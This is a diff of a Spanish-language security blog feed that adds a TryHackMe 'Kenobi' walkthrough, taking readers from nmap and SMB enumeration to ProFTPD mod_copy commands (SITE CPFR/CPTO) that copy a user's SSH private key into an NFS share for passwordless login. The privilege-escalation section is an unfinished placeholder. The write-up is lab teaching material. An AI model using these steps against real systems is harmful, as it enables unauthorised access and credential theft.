@@ -12,8 +12,213 @@
     </author>
     
       <item>
+        <title>Kenobi - TryHackMe</title>
+        <description>&lt;p&gt;Hoy vamos a estar resolviendo la máquina &lt;em&gt;Kenobi&lt;/em&gt; de &lt;em&gt;TryHackMe&lt;/em&gt;. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:80/2022-02-07-Kenobi-TryHackMe/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Reconocimiento&lt;/h3&gt;
+
+&lt;p&gt;Primeramente, vamos a utilizar la herramienta &lt;em&gt;Nmap&lt;/em&gt; para determinar que puertos están abiertos así como identificar la versión y servicios que corren en el activo.&lt;/p&gt;
+
+&lt;p&gt;Para determinar que puertos están abiertos podemos realizar lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de puertos con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;p - Escanea todo el rango de puertos (65535 en total)&lt;/li&gt;
+  &lt;li&gt;open - Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)&lt;/li&gt;
+  &lt;li&gt;T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;v - &lt;em&gt;Verbose&lt;/em&gt;, reporta lo encontrado por consola&lt;/li&gt;
+  &lt;li&gt;n - No aplicar &lt;em&gt;resolución DNS&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;sS - Escaneo &lt;em&gt;TCP SYN&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;min-rate - Emitir paquetes no más lentos que &amp;lt;valor&amp;gt; por segundo&lt;/li&gt;
+  &lt;li&gt;vvv - Triple &lt;em&gt;verbose&lt;/em&gt;, para obtener mayor información por consola&lt;/li&gt;
+  &lt;li&gt;Pn - No aplicar &lt;em&gt;host discovery&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Para determinar la versión y servicios que corren bajo estos puertos podemos realizar lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 21,22,80,111,139,445,2049,35049,41843,47869,50933 &amp;lt;dirección IP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;sC - Scripts básicos de enumeración&lt;/li&gt;
+  &lt;li&gt;sV - Versión y servicios que corren bajo los puertos encontrados&lt;/li&gt;
+  &lt;li&gt;p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Con estos dos escaneos bastaría para responder a dos de las preguntas planteadas:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;¿Cuántos puertos abiertos existen?&lt;/li&gt;
+  &lt;li&gt;¿En qué puerto está corriendo el protocolo FTP?&lt;/li&gt;
+  &lt;li&gt;¿Cuál es la versión del servicio ProFTPD que se está corriendo?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Para responder a estas dos últimas preguntas solo tenemos que revisar el escaneo de versiones y servicios que realizamos con &lt;em&gt;Nmap&lt;/em&gt;; por otra parte, la primera pregunta tiene algo de trampa, ya que la respuesta correcta es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7&lt;/code&gt; puertos abiertos, mientras que con nuestro escaneo detectamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;11&lt;/code&gt;, ¿qué hicimos mal?&lt;/p&gt;
+
+&lt;p&gt;Nada, lo que sucede es que nosotros al indicar el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p-&lt;/code&gt;, estamos escaneando todo el rango de puertos, si no indicáramos este parámetro, &lt;em&gt;Nmap&lt;/em&gt; escanearía únicamente los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1000&lt;/code&gt; puertos más comunes, por lo que vemos que &lt;em&gt;TryHackMe&lt;/em&gt; no se dio la molestia de escanearlo todo por completo.&lt;/p&gt;
+
+&lt;p&gt;Habiendo aclarado esto, los puertos abiertos más relevantes que encontramos son el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;139&lt;/code&gt; y el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;445&lt;/code&gt;, ambos relacionados con el protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; (Server Message Block), el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;111&lt;/code&gt; relacionado con el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcbind&lt;/code&gt;, relacionado a su vez con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RPC&lt;/code&gt; (Remote Procedure Call), y el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;21&lt;/code&gt; relacionado con el protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; (File Transfer Protocol).&lt;/p&gt;
+
+&lt;p&gt;En este punto, &lt;em&gt;TryHackMe&lt;/em&gt; nos sugiere usar el propio &lt;em&gt;Nmap&lt;/em&gt; para enumerar los recursos compartidos a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Samba&lt;/code&gt;, que si bien podemos hacerlo, optaremos por usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBMap&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;smbmap&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;SMBMap&lt;/h3&gt;
+
+&lt;p&gt;Para poder listar los recursos compartidos haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBMap&lt;/code&gt;, bastará con indicar la direción IP de la máquina víctima.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:80/2022-02-07-Kenobi-TryHackMe/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo primero que podemos darnos cuenta es que existen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3&lt;/code&gt; recursos compartidos, de los cuales solo tenemos acceso a uno, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Si decidimos listar de manera recursiva el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt;, encontraremos un archivo que lleva por nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log.txt&lt;/code&gt;, el cual ya levanta nuestras sospechas.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;dirección IP&amp;gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; anonymous
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:80/2022-02-07-Kenobi-TryHackMe/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para poder descargar el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log.txt&lt;/code&gt;, podremos hacerlo usando tanto su ruta absoluta con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--download&lt;/code&gt;, o bien creando patrones mediante &lt;em&gt;expresiones regulares&lt;/em&gt; con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-A&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;dirección IP&amp;gt; &lt;span class=&quot;nt&quot;&gt;--download&lt;/span&gt; anonymous/log.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;dirección IP&amp;gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; anonymous &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; log.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:80/2022-02-07-Kenobi-TryHackMe/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;smbclient&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;smbclient&lt;/h3&gt;
+
+&lt;p&gt;Para poder listar los recursos compartidos haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; tendremos que especificar el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-L&lt;/code&gt;, adicional a ello tendremos que indicar que queremos hacer uso de un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null session&lt;/code&gt; con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-N&lt;/code&gt;, ya que no conocemos credenciales con las cuales autenticarnos; esto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBMap&lt;/code&gt; no ocurría ya que por defecto hace uso de un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null session&lt;/code&gt;, a no ser que le indiquemos un usuario y contraseña.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:80/2022-02-07-Kenobi-TryHackMe/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En este caso, no se nos indica los permisos que tenemos sobre los recursos, no obstante, podemos intuir a que recursos tenemos acceso, por ejemplo, el recurso &lt;a href=&quot;https://wiki.samba.org/index.php/Setting_up_Automatic_Printer_Driver_Downloads_for_Windows_Clients#Setting_up_the_.5Bprint.24.5D_Share&quot;&gt;print$&lt;/a&gt; se relaciona con impresoras que que se están compartiendo a nivel de red, por otra parte tenemos el recurso &lt;a href=&quot;https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session&quot;&gt;IPC$&lt;/a&gt; el cual crea el propio &lt;em&gt;Windows&lt;/em&gt; para poder hacer uso de los &lt;em&gt;null sessions&lt;/em&gt;; de modo que de los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3&lt;/code&gt; recursos compartidos existentes, solo nos queda &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Lo siguiente que haremos será listar el contenido que se encuentra dentro del recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; //dirección IP/anonymous
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:80/2022-02-07-Kenobi-TryHackMe/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos observar que dentro existe un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log.txt&lt;/code&gt;, el cual procederemos a descargar.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; //dirección IP/anonymous
+get log.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:80/2022-02-07-Kenobi-TryHackMe/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Independientemente de como hayamos descargado el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log.txt&lt;/code&gt;, al leerlo, lo más importante que encontraremos será la ubicación del par de claves &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSA&lt;/code&gt;, ubicadas en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/kenobi/.ssh/id_rsa&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Adicionalmente, encontraremos información tanto del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProFTPD&lt;/code&gt;, como del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Samba&lt;/code&gt;, pero nada realmente interesante, por lo que estamos omitiendo algo.&lt;/p&gt;
+
+&lt;p&gt;Si recordamos, el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;111&lt;/code&gt;, relacionado con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcbind&lt;/code&gt;, estaba abierto, y lo que nos mostraba nuestro escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;, es que en este puerto está corriendo a su vez el protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NFS&lt;/code&gt; (Network File System) en el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2049&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;El protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NFS&lt;/code&gt; se utiliza principalmente para acceder a archivos compartidos a nivel de red, de manera local. Comprobemos si se está compartiendo algún recurso que podamos &lt;em&gt;montar&lt;/em&gt; en nuestro equipo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;showmount &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:80/2022-02-07-Kenobi-TryHackMe/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;La ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt; está siendo compartida a nivel de red, de modo que si lográramos mover algún archivo potencial dentro de esta ruta, y luego la montásemos en nuestro equipo, podríamos visualizar dicho archivo de manera local.&lt;/p&gt;
+
+&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;
+
+&lt;p&gt;Lo primero que podemos pensar es buscar alguna vulnerabilidad en el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProFTPD&lt;/code&gt;, basado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; (File Transfer Protocol), moviendo así archivos desde el lado del cliente, hacia el servidor.&lt;/p&gt;
+
+&lt;p&gt;Para explotar el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProFTPD&lt;/code&gt;, empezaremos buscando algún exploit que se encuentre en &lt;em&gt;Exploit Database&lt;/em&gt;, para ello utilizaremos &lt;em&gt;SearchSploit&lt;/em&gt; para poder seguir trabajando desde nuestra terminal.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit ProFTPD 1.3.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:80/2022-02-07-Kenobi-TryHackMe/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;De los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4&lt;/code&gt; exploits que encontramos, nos quedaremos con el último&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:80/2022-02-07-Kenobi-TryHackMe/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Concretamente con las líneas 12, 13 y 14.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:80/2022-02-07-Kenobi-TryHackMe/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Las cuales nos permiten hacer justamente lo que nos interesa, copiar un archivo de una ruta (&lt;em&gt;CPFR&lt;/em&gt;), a otra (&lt;em&gt;CPTO&lt;/em&gt;).&lt;/p&gt;
+
+&lt;p&gt;De este modo, si nos conectamos a la máquina víctima a través del puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;21&lt;/code&gt;, podremos ejecutar estos comandos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &amp;lt;direción IP&amp;gt; 21
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SITE CPFR /home/kenobi/.ssh/id_rsa
+SITE CPTO /var/tmp/id_rsa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:80/2022-02-07-Kenobi-TryHackMe/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya con todo esto, podemos &lt;em&gt;montar&lt;/em&gt; la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt; en nuestro equipo, para ello haremos lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;mount &amp;lt;dirección IP&amp;gt;:/var /mnt/kenobiNFS
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En caso de que tengamos un error similar a este:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:80/2022-02-07-Kenobi-TryHackMe/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Simplemente tendremos que instalar lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;nfs-common
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y ya que estamos, podemos también instalar la utilidad para montar archivo de tipo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CIFS&lt;/code&gt;, que puede resultarnos de utilidad en algún momento.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;cifs-utils
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez tenemos montada la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var&lt;/code&gt; en nuestro equipo, procederemos a copiarnos el par de claves &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSA&lt;/code&gt; que movimos con anterioridad haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProFTPD&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Finalmente, podemos conectarnos a la máquina víctima a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt; sin proporcionar contraseña, ya que tenemos en nuestro poder la &lt;em&gt;clave privada&lt;/em&gt; del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kenobi&lt;/code&gt;, no obstante, antes de hacerlo, vamos a asignar los permisos correspondientes al archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo chmod &lt;/span&gt;600 id_rsa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;escalada-de-privilegios&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Escalada De Privilegios&lt;/h3&gt;
+
+&lt;p&gt;GHI&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:80/2022-02-07-Kenobi-TryHackMe/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Mon, 07 Feb 2022 00:00:00 -0500</pubDate>
+        <link>http://0.0.0.0:8000//Kenobi-TryHackMe</link>
+        <link href="http://0.0.0.0:8000/Kenobi-TryHackMe"/>
+        <guid isPermaLink="true">http://0.0.0.0:8000/Kenobi-TryHackMe</guid>
+      </item>
+    
+      <item>
         <title>KnightCTF 2022</title>
-        <description>&lt;p&gt;KnightCTF 2022, es el primer &lt;em&gt;capture de flag&lt;/em&gt; organizado por &lt;a href=&quot;https://knightsquad.org/&quot;&gt;Knight Squad&lt;/a&gt;, este es de tipo &lt;em&gt;jeopardy&lt;/em&gt;, por lo que encontraremos distintas categorías.&lt;/p&gt;
+        <description>&lt;p&gt;KnightCTF 2022, es el primer &lt;em&gt;capture the flag&lt;/em&gt; organizado por &lt;a href=&quot;https://knightsquad.org/&quot;&gt;Knight Squad&lt;/a&gt;, este es de tipo &lt;em&gt;jeopardy&lt;/em&gt;, por lo que encontraremos distintas categorías.&lt;/p&gt;
 
 &lt;div style=&quot;text-align:center&quot;&gt;
   &lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/1.png&quot; /&gt;
@@ -1229,7 +1434,7 @@ ssh-keygen
 
 &lt;h3 id=&quot;fase-de-explotación---file-upload-bypass&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación - File Upload Bypass&lt;/h3&gt;
 
-&lt;p&gt;Si recordamos, en la fase de explotación a través del uso de un &lt;em&gt;LFI&lt;/em&gt;, habíamos descubierto un panel de login de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vtiger CRM&lt;/code&gt;; al igual que en las situaciones anteriores, podemos probar una serie de credenciales por defecto, pero estas no servirán, por lo que nos queda la opción de reutilizar las credenciales que ya habíamos encontrado.&lt;/p&gt;
+&lt;p&gt;Si recordamos, en la fase de explotación a través del uso de un &lt;em&gt;LFI&lt;/em&gt;, habíamos descubierto un panel de login de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Vtiger CRM&lt;/code&gt;; al igual que en las situaciones anteriores, podemos probar una serie de credenciales por defecto, pero estas no servirán, por lo que nos queda la opción de reutilizar las credenciales que ya habíamos encontrado.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -1313,7 +1518,7 @@ ssh-keygen
 &lt;ul&gt;
   &lt;li&gt;p - Escanea todo el rango de puertos (65535 en total)&lt;/li&gt;
   &lt;li&gt;open - Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)&lt;/li&gt;
-  &lt;li&gt;T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido  “, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/li&gt;
